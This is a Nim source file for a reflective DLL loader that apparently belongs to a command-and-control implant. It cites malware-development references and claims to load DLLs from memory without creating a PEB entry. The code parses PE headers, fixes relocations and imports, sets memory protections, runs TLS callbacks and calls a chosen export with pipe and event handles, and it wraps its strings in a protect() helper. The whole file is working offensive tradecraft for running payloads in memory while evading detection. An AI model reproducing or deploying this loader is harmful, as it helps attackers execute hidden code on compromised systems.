import winim/lean
import strformat
import ./io
import ../../../common/utils

#[
    Reflective DLL / PE Loader
    Maps a PE image from raw bytes without LoadLibrary — no PEB entry created.

    References:
    - https://maldevacademy.com/new/modules/28
    - https://github.com/Helixo32/NimReflectiveLoader
    - https://github.com/S3cur3Th1sSh1t/Nim-RunPE
    - https://kuwaitist.github.io/posts/ASYNC-BOFS/
]#

# Type defintions
type 
    PE_HDRS = object 
        pFileBuffer: PBYTE
        dwFileSize: DWORD 
        pImgNtHdrs: PIMAGE_NT_HEADERS
        pImgSecHdr: PIMAGE_SECTION_HEADER
        pEntryImportDataDir: PIMAGE_DATA_DIRECTORY
        pEntryBaseRelocDataDir: PIMAGE_DATA_DIRECTORY
        pEntryTLSDataDir: PIMAGE_DATA_DIRECTORY
        pEntryExceptionDataDir: PIMAGE_DATA_DIRECTORY
        pEntryExportDataDir: PIMAGE_DATA_DIRECTORY
        bIsDLL: bool

    PPE_HDRS = ptr PE_HDRS

    IMAGE_RUNTIME_FUNCTION_ENTRY_UNION {.pure, union.} = object
        UnwindInfoAddress: DWORD
        UnwindData: DWORD
    
    IMAGE_RUNTIME_FUNCTION_ENTRY {.pure.} = object
        BeginAddress: DWORD
        EndAddress: DWORD
        u1: IMAGE_RUNTIME_FUNCTION_ENTRY_UNION

    PIMAGE_RUNTIME_FUNCTION_ENTRY = ptr IMAGE_RUNTIME_FUNCTION_ENTRY

    DllMainProc = proc(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall.}
    RunProc = proc(args: PBYTE, dwSize: DWORD, hWrite, hWakeup, hStopEvent: HANDLE): BOOL {.stdcall.}

const 
    IMAGE_ORDINAL_FLAG64 = 0x8000000000000000'i64
    IMAGE_ORDINAL_FLAG32 = 0x80000000'i32 

# Initialize PE Headers
template IMAGE_FIRST_SECTION(pImgNtHdrs: PIMAGE_NT_HEADERS): PIMAGE_SECTION_HEADER = 
    cast[PIMAGE_SECTION_HEADER](cast[uint](pImgNtHdrs) + cast[uint](offsetof(IMAGE_NT_HEADERS, OptionalHeader)) + cast[uint](pImgNtHdrs.FileHeader.SizeOfOptionalHeader)) 

proc initHeaders(pFileBuffer: PBYTE, dwFileSize: DWORD): PE_HDRS = 
    
    var peHdrs: PE_HDRS
    
    if pFileBuffer == NULL or dwFileSize == 0:
        raise newException(CatchableError, protect("Not a valid PE file."))

    let dosHeader = cast[PIMAGE_DOS_HEADER](pFileBuffer)
    if dosHeader.e_magic != IMAGE_DOS_SIGNATURE:
        raise newException(CatchableError, protect("Not a valid PE file (invalid DOS signature)."))

    if cast[DWORD](dosHeader.e_lfanew) + DWORD(sizeof(IMAGE_NT_HEADERS)) > dwFileSize:
        raise newException(CatchableError, protect("Not a valid PE file (NT headers out of bounds)."))

    peHdrs.pFileBuffer = pFileBuffer
    peHdrs.dwFileSize = dwFileSize
    peHdrs.pImgNtHdrs = cast[PIMAGE_NT_HEADERS](cast[uint](pFileBuffer) + cast[uint](dosHeader.e_lfanew))

    if peHdrs.pImgNtHdrs.Signature != IMAGE_NT_SIGNATURE:
        raise newException(CatchableError, protect("Not a valid PE file (invalid NT signature)."))

    peHdrs.bIsDLL = (peHdrs.pImgNtHdrs.FileHeader.Characteristics and IMAGE_FILE_DLL) != 0
    peHdrs.pImgSecHdr = IMAGE_FIRST_SECTION(peHdrs.pImgNtHdrs)
    peHdrs.pEntryImportDataDir = addr peHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
    peHdrs.pEntryBaseRelocDataDir = addr peHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
    peHdrs.pEntryTLSDataDir = addr peHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]
    peHdrs.pEntryExceptionDataDir = addr peHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]
    peHdrs.pEntryExportDataDir = addr peHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]

    return peHdrs

# Relocations 
template RELOC_TYPE(entry: WORD): WORD = (entry shr 12) and 0xF'u16
template RELOC_OFFSET(entry: WORD): WORD = pBaseRelocEntry[0] and 0x0FFF

proc fixRelocations(pEntryBaseRelocDataDir: PIMAGE_DATA_DIRECTORY, pPeBase: PBYTE, pPreferableBase: PBYTE): bool =
    if pEntryBaseRelocDataDir.Size == 0: return true
    if pPeBase == pPreferableBase: return true

    var pImgBaseRelocation = cast[PIMAGE_BASE_RELOCATION](cast[uint](pPeBase) + cast[uint](pEntryBaseRelocDataDir.VirtualAddress))
    let deltaOffset = cast[uint](pPeBase) - cast[uint](pPreferableBase)

    while pImgBaseRelocation.VirtualAddress != 0:
        # Get first relocation entry in the current relocation block
        var pBaseRelocEntry = cast[ptr UncheckedArray[WORD]](cast[uint](pImgBaseRelocation) + cast[uint](sizeof(IMAGE_BASE_RELOCATION)))

        # Iterate over relocation entries in current relocation block 
        while cast[uint](pBaseRelocEntry) < cast[uint](pImgBaseRelocation) + cast[uint](pImgBaseRelocation.SizeOfBlock):
            let target  = cast[uint](pPeBase) + cast[uint](pImgBaseRelocation.VirtualAddress) + cast[uint](RELOC_OFFSET(pBaseRelocEntry[0]))
            
            # Process relocation entry based on its type
            case RELOC_TYPE(pBaseRelocEntry[0]) 
            of IMAGE_REL_BASED_DIR64:
                cast[ptr ULONG_PTR](target)[] += cast[ULONG_PTR](deltaOffset)
            of IMAGE_REL_BASED_HIGHLOW:
                cast[ptr DWORD](target)[] += DWORD(deltaOffset)
            of IMAGE_REL_BASED_HIGH:
                cast[ptr WORD](target)[] += WORD(deltaOffset shr 16)
            of IMAGE_REL_BASED_LOW:
                cast[ptr WORD](target)[] += WORD(deltaOffset and 0xFFFF)
            of IMAGE_REL_BASED_ABSOLUTE:
                # No relocation required
                discard
            else:
                return false

            # Move to the next relocation entry
            pBaseRelocEntry = cast[ptr UncheckedArray[WORD]](cast[uint](pBaseRelocEntry) + cast[uint](sizeof(WORD)))

        # Move to the next relocation block
        pImgBaseRelocation = cast[PIMAGE_BASE_RELOCATION](pBaseRelocEntry)

    return true

# Import Address Table
template IMAGE_SNAP_BY_ORDINAL64*(ordinal: ULONGLONG): bool = (ordinal and IMAGE_ORDINAL_FLAG64) != 0
template IMAGE_SNAP_BY_ORDINAL32*(ordinal: DWORD): bool = (ordinal and IMAGE_ORDINAL_FLAG32) != 0
template IMAGE_ORDINAL64*(ordinal: ULONGLONG): ULONGLONG = ordinal and 0xffff'u64
template IMAGE_ORDINAL32*(ordinal: DWORD): DWORD = ordinal and 0xffff'u32
template IMAGE_ORDINAL*(ordinal: uint): uint = ordinal and 0xffff

proc fixImportAddressTable(pEntryImportDataDir: PIMAGE_DATA_DIRECTORY, pPeBase: PBYTE): bool =
    if pEntryImportDataDir.Size == 0: return true

    var i: SIZE_T = 0
    while i < cast[SIZE_T](pEntryImportDataDir.Size):
        let pImgDescriptor = cast[PIMAGE_IMPORT_DESCRIPTOR](cast[uint](pPeBase) + cast[uint](pEntryImportDataDir.VirtualAddress) + cast[uint](i))
        if pImgDescriptor.union1.OriginalFirstThunk == 0 and pImgDescriptor.FirstThunk == 0:
            break

        # Load the DLL referenced by the current import descriptor
        let dllName = cast[LPCSTR](cast[uint](pPeBase) + cast[uint](pImgDescriptor.Name))
        let hModule = LoadLibraryA(dllName)
        if hModule == 0:
            raise newException(CatchableError, GetLastError().getError())

        var thunkOffset: uint = 0
        # Iterate over imported functions in the current DLL 
        while true:
            let pOriginalFirstThunk = cast[PIMAGE_THUNK_DATA](cast[uint](pPeBase) + cast[uint](pImgDescriptor.union1.OriginalFirstThunk) + thunkOffset)
            let pFirstThunk  = cast[PIMAGE_THUNK_DATA](cast[uint](pPeBase) + cast[uint](pImgDescriptor.FirstThunk) + thunkOffset)

            if pOriginalFirstThunk.u1.Function == 0 and pFirstThunk.u1.Function == 0:
                break

            var funcAddr: FARPROC

            # Import function by ordinal number
            if IMAGE_SNAP_BY_ORDINAL64(pOriginalFirstThunk.u1.Ordinal):
                funcAddr = GetProcAddress(hModule, cast[LPCSTR](IMAGE_ORDINAL(pOriginalFirstThunk.u1.Ordinal)))
                if funcAddr == nil:
                    raise newException(CatchableError, GetLastError().getError())
            
            # Import function by name
            else:
                let pImgImportByName = cast[PIMAGE_IMPORT_BY_NAME](cast[uint](pPeBase) + cast[uint](pOriginalFirstThunk.u1.AddressOfData))
                let funcName = cast[LPCSTR](addr pImgImportByName.Name)
                funcAddr = GetProcAddress(hModule, funcName)
                if funcAddr == nil:
                    raise newException(CatchableError, GetLastError().getError())


            pFirstThunk.u1.Function = cast[ULONGLONG](funcAddr)
            thunkOffset += uint(sizeof(IMAGE_THUNK_DATA))

        i += SIZE_T(sizeof(IMAGE_IMPORT_DESCRIPTOR))

    return true

# Memory Permissions
proc fixMemoryPermissions(pPeBase: PBYTE, pImgNtHdrs: PIMAGE_NT_HEADERS, pImgSecHdr: PIMAGE_SECTION_HEADER): bool = 
    var sections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](pImgSecHdr)

    for i in 0 ..< int(pImgNtHdrs.FileHeader.NumberOfSections): 
        var 
            dwProtect: DWORD 
            dwOldProtect: DWORD 

        # Skip the section if it has no data or no associated virtual address       
        if sections[i].SizeOfRawData == 0 or sections[i].VirtualAddress == 0:
            continue 
        
        # Determine memory protection based on section characteristics
        let characteristics = sections[i].Characteristics
        if (characteristics and IMAGE_SCN_MEM_EXECUTE) != 0 and (characteristics and IMAGE_SCN_MEM_WRITE) != 0 and (characteristics and IMAGE_SCN_MEM_READ) != 0:
            dwProtect = PAGE_EXECUTE_READWRITE
        elif (characteristics and IMAGE_SCN_MEM_EXECUTE) != 0 and (characteristics and IMAGE_SCN_MEM_READ) != 0:
            dwProtect = PAGE_EXECUTE_READ
        elif (characteristics and IMAGE_SCN_MEM_EXECUTE) != 0 and (characteristics and IMAGE_SCN_MEM_WRITE) != 0:
            dwProtect = PAGE_EXECUTE_WRITECOPY
        elif (characteristics and IMAGE_SCN_MEM_EXECUTE) != 0:
            dwProtect = PAGE_EXECUTE
        elif (characteristics and IMAGE_SCN_MEM_WRITE) != 0 and (characteristics and IMAGE_SCN_MEM_READ) != 0:
            dwProtect = PAGE_READWRITE
        elif (characteristics and IMAGE_SCN_MEM_READ) != 0:
            dwProtect = PAGE_READONLY
        elif (characteristics and IMAGE_SCN_MEM_WRITE) != 0:
            dwProtect = PAGE_WRITECOPY
        else:
            dwProtect = PAGE_NOACCESS

        # Apply determined memory protection
        if VirtualProtect(cast[PVOID](cast[uint](pPeBase) + cast[uint](sections[i].VirtualAddress)), sections[i].SizeOfRawData, dwProtect, addr dwOldProtect) == 0:
            raise newException(CatchableError, GetLastError().getError())

    return true

# Export Retrieval
proc getExportAddress(pEntryExportDataDir: PIMAGE_DATA_DIRECTORY, pPeBase: PBYTE, exportName: string): PVOID = 
    let 
        pExportDir = cast[PIMAGE_EXPORT_DIRECTORY](cast[uint](pPeBase) + cast[uint](pEntryExportDataDir.VirtualAddress))
        names = cast[ptr UncheckedArray[DWORD]](cast[uint](pPeBase) + cast[uint](pExportDir.AddressOfNames))
        addresses = cast[ptr UncheckedArray[DWORD]](cast[uint](pPeBase) + cast[uint](pExportDir.AddressOfFunctions))
        ordinals = cast[ptr UncheckedArray[WORD]](cast[uint](pPeBase)  + cast[uint](pExportDir.AddressOfNameOrdinals))

    for i in 0 ..< int(pExportDir.NumberOfFunctions):
        let name = $(cast[cstring](cast[uint](pPeBase) + cast[uint](names[i])))
        if name == exportName:
            return cast[PVOID](cast[uint](pPeBase) + cast[uint](addresses[ordinals[i]]))

    return NULL 

# Exception handlers
proc registerExceptionHandlers(pEntryExceptionDataDir: PIMAGE_DATA_DIRECTORY, pPeBase: PBYTE): bool = 
    let pRuntimeFuncEntry = cast[PIMAGE_RUNTIME_FUNCTION_ENTRY](cast[uint](pPeBase) + cast[uint](pEntryExceptionDataDir.VirtualAddress))
    return RtlAddFunctionTable(cast[PRUNTIME_FUNCTION](pRuntimeFuncEntry), pEntryExceptionDataDir.Size div DWORD(sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), cast[ULONG64](pPeBase)) != 0

# TLS Callbacks
proc executeTLSCallbacks(pEntryTLSDataDir: PIMAGE_DATA_DIRECTORY, pPeBase: PBYTE): bool {.gcsafe.} = 
    let pTlsDir = cast[PIMAGE_TLS_DIRECTORY](cast[uint](pPeBase) + cast[uint](pEntryTLSDataDir.VirtualAddress))
    var pCallbacks = cast[ptr UncheckedArray[PIMAGE_TLS_CALLBACK]](pTlsDir.AddressOfCallBacks)
    
    # Invoke each TLS callback until a NULL callback is encountered
    while pCallbacks[0] != nil:
        {.cast(gcsafe).}:
            pCallbacks[0](cast[PVOID](pPeBase), DLL_PROCESS_ATTACH, nil)
        pCallbacks = cast[ptr UncheckedArray[PIMAGE_TLS_CALLBACK]](cast[uint](pCallbacks) + uint(sizeof(PIMAGE_TLS_CALLBACK)))

    return true

# Execution
proc execDll*(dllBytes: seq[byte], exportName: string, args: seq[byte], hWrite, hWakeupEvent, hStopEvent: HANDLE) {.gcsafe.} = 
    
    if dllBytes.len() == 0: return

    var
        peHdrs: PE_HDRS
        pPeBase: PBYTE 
        pExportedFunction: PVOID

    # Initialize PE Headers
    peHdrs = initHeaders(cast[PBYTE](addr dllBytes[0]), cast[DWORD](dllBytes.len()))
    if not peHdrs.bIsDLL:
        raise newException(CatchableError, protect("PE is not a DLL."))    

    # Allocate memory for image
    pPeBase = cast[PBYTE](VirtualAlloc(NULL, peHdrs.pImgNtHdrs.OptionalHeader.SizeOfImage, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE))
    if pPeBase == nil: 
        raise newException(CatchableError, GetLastError().getError())
    defer: VirtualFree(pPeBase, 0, MEM_RELEASE)

    # Copy headers 
    copyMem(pPeBase, peHdrs.pFileBuffer, peHdrs.pImgNtHdrs.OptionalHeader.SizeOfHeaders)

    # Copy over sections into the newly allocated virtual memory
    var sections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](peHdrs.pImgSecHdr)
    for i in 0 ..< int(peHdrs.pImgNtHdrs.FileHeader.NumberOfSections): 
        let pDst = cast[PBYTE](cast[uint](pPeBase) + cast[uint](sections[i].VirtualAddress))
        let pSrc = cast[PBYTE](cast[uint](peHdrs.pFileBuffer) + cast[uint](sections[i].PointerToRawData))
        copyMem(pDst, pSrc, sections[i].SizeOfRawData)
        print fmt"    [>] {$(addr sections[i].Name)} @ 0x{sections[i].PointerToRawData.repr} ({$sections[i].SizeOfRawData} bytes))"

    # Fix relocations
    if not fixRelocations(peHdrs.pEntryBaseRelocDataDir, pPeBase, cast[PBYTE](peHdrs.pImgNtHdrs.OptionalHeader.ImageBase)):
        raise newException(CatchableError, GetLastError().getError())
    print protect("    [+] Relocations fixed.")

    # Fix Import Address Table
    if not fixImportAddressTable(peHdrs.pEntryImportDataDir, pPeBase): 
        raise newException(CatchableError, GetLastError().getError())
    print protect("    [+] IAT fixed.")

    # Fix memory permissions
    if not fixMemoryPermissions(pPeBase, peHdrs.pImgNtHdrs, peHdrs.pImgSecHdr): 
        raise newException(CatchableError, GetLastError().getError())
    print protect("    [+] Memory permissions fixed.")

    # Resolve exported function
    pExportedFunction = getExportAddress(peHdrs.pEntryExportDataDir, pPeBase, exportName)
    if pExportedFunction == nil: 
        raise newException(CatchableError, protect("Exported function not found."))
    print protect("    [*] Exported function: 0x"), pExportedFunction.repr

    # Register exception handlers
    if peHdrs.pEntryExceptionDataDir.Size != 0 and not registerExceptionHandlers(peHdrs.pEntryExceptionDataDir, pPeBase):
        raise newException(CatchableError, GetLastError().getError())

    # Execute TLS callbacks
    # Thread Local Storage is a mechanism that grants each thread its own unique storage for data, which ensures that data is not shared between threads
    if peHdrs.pEntryTLSDataDir.Size != 0 and not executeTLSCallbacks(peHdrs.pEntryTLSDataDir, pPeBase):
        raise newException(CatchableError, GetLastError().getError())

    # # Execute DllMain entry point (optional, if NimMain() is called from exported function)
    # let pEntryPoint = cast[uint](pPeBase) + cast[uint](peHdrs.pImgNtHdrs.OptionalHeader.AddressOfEntryPoint)
    # let dllMain = cast[DllMainProc](pEntryPoint)
    # {.cast(gcsafe).}:
    #     discard dllMain(cast[HINSTANCE](pPeBase), DLL_PROCESS_ATTACH, nil)  

    # Execute exported function
    # If the DLL is implemented in Nim, the NimMain() function needs to be called first (either by DllMain or at the beginning of the exported function)
    {.cast(gcsafe).}:
        let run = cast[RunProc](pExportedFunction)
        let status = run(if args.len > 0: cast[PBYTE](addr args[0]) else: nil, cast[DWORD](args.len), hWrite, hWakeupEvent, hStopEvent)
        if status == FALSE:
            raise newException(CatchableError, "")

    # Cleanup
    if peHdrs.pEntryExceptionDataDir.Size != 0:
        let pRuntimeFuncEntry = cast[PIMAGE_RUNTIME_FUNCTION_ENTRY](cast[uint](pPeBase) + cast[uint](peHdrs.pEntryExceptionDataDir.VirtualAddress))
        discard RtlDeleteFunctionTable(cast[PRUNTIME_FUNCTION](pRuntimeFuncEntry))